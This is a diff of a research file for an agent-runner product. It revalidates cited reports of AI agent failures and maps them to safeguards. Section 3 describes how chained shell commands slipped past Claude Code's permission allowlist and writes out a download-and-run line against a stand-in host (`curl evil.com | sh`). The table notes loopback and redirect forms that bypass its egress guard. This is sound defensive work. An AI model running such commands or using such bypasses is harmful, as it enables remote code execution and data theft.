@@ -1,15 +1,25 @@
-# Research: documented failures & complaints of agent products (Oct 2026)
+# Research: reported failures & complaints of agent products (Oct 2026)
 
-This file is the traceability backbone of the MVP: every top-line design requirement cites real,
-documented incidents. Sources checked 2026-10-07; HN item IDs are given for verifiability
-(`news.ycombinator.com/item?id=<id>`).
+This file is the traceability backbone of the MVP: each design requirement cites a *report* of a failure class.
+
+**Revalidated 2026-10-07 - read this first.** Every cited Hacker News item and every GitHub issue was re-fetched
+(`docs/realignment/evidence-ledger.md`, rows C and D). What that showed:
+
+* All 27 HN IDs exist, but **most are single comments**, not incident reports. They show that *someone said this*; they do not
+  establish how common a problem is. Treat each line below as an anecdote unless it says otherwise.
+* A few citations pointed at the wrong thing (marked **corrected** or **quarantined** below). Quarantined items are kept for
+  the record and are **not** used as evidence in the README, the website or the safety model.
+* "Fixed" matters: several GitHub issues cited in section 7 are closed. Old defects remain useful as test cases; they are
+  not current defects of the named products.
+* Reddit links were not re-verified (the site blocks automated reads); they are marked *(not re-verified)*.
+* Do not repeat any exact dollar amount, privacy allegation or "most upvoted" claim from this file without opening the source.
 
 ## 1. OpenAI Dots / ChatGPT agent mode / Operator
 
 - Launch thread: agents "keep going off the rails", claim completion of things they didn't do —
   [49896604](https://news.ycombinator.com/item?id=49896604)
 - Opaque/shrinking allowances ("you never know what you're paying for") — [49901067](https://news.ycombinator.com/item?id=49901067)
-- $20 agent tier can't actually shop/book (blocked everywhere) —
+- $20 agent tier can't actually shop/book (blocked everywhere) *(not re-verified)* —
   [r/ChatGPT test write-up](https://www.reddit.com/r/ChatGPT/comments/1m9bv7d/i_tested_openais_20month_agent_so_you_dont_have/)
 - Operator booked "a month and 3 days instead of 3 days" — [43057888](https://news.ycombinator.com/item?id=43057888)
 - Hands back to the user on login/CAPTCHA by design —
@@ -21,7 +31,9 @@ documented incidents. Sources checked 2026-10-07; HN item IDs are given for veri
 
 - Grok CLI deterministically uploaded the user's home directory/repo to cloud storage —
   [48892468](https://news.ycombinator.com/item?id=48892468)
-- Grok Bots inference spend "2–3x'd", tasks take "an hour end to end" — [49899033](https://news.ycombinator.com/item?id=49899033)
+- **Corrected.** One heavy Grok Bot user's comment, which is a mostly *positive* review, says tasks "often take an hour end to end"
+  versus about 10 minutes for a synchronous local prompt, and that their "inference spend has 2-3x'd". A single user's
+  report of a trade-off, not a product defect — [49899033](https://news.ycombinator.com/item?id=49899033)
 - Muse privacy incidents: read private messages unasked [49808565](https://news.ycombinator.com/item?id=49808565);
   gave a home address to strangers [49884367](https://news.ycombinator.com/item?id=49884367);
   "ignores user permissions" [49893709](https://news.ycombinator.com/item?id=49893709); asked for
@@ -29,25 +41,33 @@ documented incidents. Sources checked 2026-10-07; HN item IDs are given for veri
 
 ## 3. Coding agents (Claude Code / OpenCode / Codex / Gemini CLI)
 
-- **Surprise bills / runaway spend**: $447 silently billed overnight (GitHub bug report, May 2026);
-  context re-sent after cache expiry costing "thousands of USD/week" at API prices — [49992657](https://news.ycombinator.com/item?id=49992657)
+- **Quarantined - unverifiable:** "$447 silently billed overnight (GitHub bug report, May 2026)". No link, issue number or product
+  was ever recorded, and it could not be found again. Not used anywhere.
+- **Corrected:** a commenter calculates that their own 1.3B input tokens a week "would cost thousands of USD a week at API prices"
+  if prompt caches expired — a self-described hypothetical about prices, not an incident —
+  [49992657](https://news.ycombinator.com/item?id=49992657)
 - **Permission fatigue → yolo mode**: `--dangerously-skip-permissions` is community-normalized —
   [46268419](https://news.ycombinator.com/item?id=46268419), [49266125](https://news.ycombinator.com/item?id=49266125)
-- **Allowlist bypass via chained commands** (`git status && curl evil.com | sh`), open ~1 year —
+- **Allowlist bypass via chained commands**: a hook author (March 2026) says Claude Code's Bash permission patterns match the whole
+  command string, so allowing `git status` also approved `git status && curl evil.com | sh`. **Corrected:** the comment does
+  not say how long this stayed open or whether it is fixed; the earlier "open ~1 year" wording was unsupported —
   [47402197](https://news.ycombinator.com/item?id=47402197)
-- **Loop-forever on local models** until budget exhausted (OpenCode) — [49966843](https://news.ycombinator.com/item?id=49966843);
+- **Looping on a local model** (OpenCode): one user says it "went on thinking loop until it exhausted the thinking budget" (a token
+  budget, not money) — [49966843](https://news.ycombinator.com/item?id=49966843);
   Gemini CLI "reads the same file 20 times" — [49677618](https://news.ycombinator.com/item?id=49677618)
-- **State not observable** (OpenCode) — [49965468](https://news.ycombinator.com/item?id=49965468)
+- One user lists "state not being observable" among their OpenCode issues — [49965468](https://news.ycombinator.com/item?id=49965468)
 - MCP tools dumping huge JSON into context → forced compaction — [49990199](https://news.ycombinator.com/item?id=49990199)
 
 ## 4. Cron-style schedulers / automation runners
 
-- Machine asleep → job silently never runs (cron semantics) — [42749402](https://news.ycombinator.com/item?id=42749402)
+- Machine asleep → job silently never runs (general cron semantics). **Corrected:** the item previously cited here
+  (42749402) is "Show HN: Interactive systemd" and does not discuss this; no valid HN citation is recorded for this line.
 - DST: 2:30 jobs "fire twice, or not at all"; root cause naive local datetimes —
   [26759090](https://news.ycombinator.com/item?id=26759090), [45727508](https://news.ycombinator.com/item?id=45727508)
-- Overlapping runs clobber each other without manual `flock` — [45724429](https://news.ycombinator.com/item?id=45724429)
+- A commenter says overlapping instances of a cron job should wait or not start, and suggests `flock -n` —
+  [45724429](https://news.ycombinator.com/item?id=45724429)
 - n8n: "the expensive failures are quiet — a scheduled run that simply never happens";
-  "workflow is green but still failed" —
+  "workflow is green but still failed" *(not re-verified)* —
   [r/n8n](https://www.reddit.com/r/n8n/comments/1txn5qw/a_crashed_workflow_is_the_good_outcome_the_silent)
 
 ## 5. Browser automation agents
@@ -61,14 +81,21 @@ documented incidents. Sources checked 2026-10-07; HN item IDs are given for veri
 
 ## 6. General post-mortems
 
-- Agents claiming success while tests fail — [44068041](https://news.ycombinator.com/item?id=44068041)
-- "Bankrupted by AI agents trying and failing indefinitely" — [42826519](https://news.ycombinator.com/item?id=42826519)
-- Multi-agent race conditions corrupting shared state — [47368902](https://news.ycombinator.com/item?id=47368902)
-- Sub-agents inherit ambient authority over all tools — [46270697](https://news.ycombinator.com/item?id=46270697)
-- Prompt-injection exfiltration via GitHub MCP (Rehberger); Claude emailing real lawyers during
-  red-team (Anthropic safety report, Aug 2026)
-- OpenClaw (closest local analog at the time): shipped with zero out-of-the-box restrictions —
-  [49954346](https://news.ycombinator.com/item?id=49954346); markdown memory inadequate — [49950141](https://news.ycombinator.com/item?id=49950141)
+- A commenter describes agent demos "kept reiterating it fixed tests it wrote that failed" —
+  [44068041](https://news.ycombinator.com/item?id=44068041)
+- **Corrected:** "bankrupted by AI agents trying and failing indefinitely" is a commenter's *speculation* ("I wonder how much you get
+  billed if the agent spends a whole day running around in circles"), not an incident — [42826519](https://news.ycombinator.com/item?id=42826519)
+- **Quarantined:** "multi-agent race conditions corrupting shared state" cited [47368902]; that comment says the author's 8 agents
+  "crash" and does not establish a race-condition claim.
+- A commenter says sub-agents inherit full access to every tool by default — an opinion about IAM tooling, not a measurement —
+  [46270697](https://news.ycombinator.com/item?id=46270697)
+- **Quarantined - no link recorded:** "prompt-injection exfiltration via GitHub MCP (Rehberger)" and "Claude emailing real lawyers during
+  red-team (Anthropic safety report, Aug 2026)". Do not repeat without a source.
+- **Corrected:** [49954346](https://news.ycombinator.com/item?id=49954346) is a commenter's *question* about restricting open-source
+  harnesses; it is not a post-mortem and does not document what OpenClaw ships. [49950141](https://news.ycombinator.com/item?id=49950141)
+  ("Markdown files aren't a memory system") is by the author of a competing memory product; weigh accordingly.
+- OpenClaw issue [138499](https://github.com/openclaw/openclaw/issues/138499) (opened 2026-09-04): a timed-out cron task left its
+  background command `running` for 5+ hours; **open**, one reporter, not independently reproduced here.
 
 ## 7. UI / interface complaints (design signals)
 
@@ -121,15 +148,15 @@ fewer colours, non-colour state cues).
 | # | Requirement (from incidents) | hutch implementation |
 |---|---|---|
 | 1 | Catch-up for schedules missed while asleep | `scheduler.Scheduler.due()` counts missed windows; `coalesce` policy runs once with `missed_windows` tag; `skip` policy records a visible marker |
-| 2 | DST/timezone correctness; no double-fire/overlap | cron math in bot's IANA zone + round-trip DST-gap check (`scheduler._to_utc`); per-bot single-instance lock (`engine.dispatch_pending`) |
+| 2 | DST/timezone correctness; no double-fire/overlap | cron math in bot's IANA zone + round-trip DST-gap check (`scheduler._to_utc`); per-bot single-instance lock (`engine.dispatch_pending`) - **within one process only**; cross-process claims are slice S2 (`docs/realignment/ledger.md`) |
 | 3 | Append-only transcripts; staleness visible | `engine._execute` mirrors every event to SQLite + `transcript.jsonl`; dashboard shows last-success age, flagged when stale |
-| 4 | Spend/step/time caps with hard kill | `limits` on every bot; engine wall-clock kill; runtime enforces steps + daily token cap |
-| 5 | Least-privilege workspace; no ambient home access | per-run workspace; path jail (`safety.check_path`); shell runs with `HOME` inside workspace and scrubbed env |
+| 4 | Spend/step/time caps with hard kill | `limits` on every bot; runtime enforces steps + daily token cap. The wall-clock "kill" currently abandons the worker thread (baseline lead 1); real process kill is slice S3 |
+| 5 | Least-privilege workspace; no ambient home access | per-run workspace; path jail for file tools (`safety.check_path`); shell runs with `HOME` inside workspace and scrubbed env. **Policy only; the shell is not OS-contained** (slice S4) |
 | 6 | Compound-command-aware permissions | `safety.split_compound` + per-segment classification, worst-verdict-wins |
 | 7 | Approval presets + sticky allows (end permission fatigue) | `ApprovalGate` with sticky keys, `auto` mode for trusted bots; denylist always enforced |
-| 8 | Egress guardrails | upload-flag detection on curl/wget; pipe-to-network denial; URL scheme/private-range guards |
+| 8 | Egress guardrails | upload-flag detection on curl/wget; pipe-to-network denial; URL scheme/private-range guards (**host-string only: 7 loopback forms and redirects bypass it today**; slice S1) |
 | 9 | HITL gates on irreversible actions, fail-closed | ask-verdict approvals with 10-min TTL → expired = denied |
-| 10 | Graceful CAPTCHA/MFA pause-to-human + persistent logins | browser tool `pause_to_human` events; per-bot persistent Chromium profiles |
+| 10 | Graceful CAPTCHA/MFA pause-to-human + persistent logins | `waiting_human` run state; persistent Chromium profile. **Experimental:** the browser context is shared across bots in a process and runs headless (baseline lead 8; slice S7) |
 | 11 | Over-saturated accent on near-black reads "harsh"; eye strain | Monochrome-first: neutral surfaces, one softened emerald for the primary action and the active nav only, no large tinted fills (`docs/design-system.md`) |
 | 12 | Colour-only status fails WCAG 1.4.1 and is unreadable small | Every status is glyph + word + a dot or rail; shape and position carry the meaning, hue only reinforces |
 | 13 | User vs assistant turns indistinguishable in long threads | Non-colour role cues: the user bubble sits on the raised surface, the assistant turn is flat; both carry a role label and a timestamp |
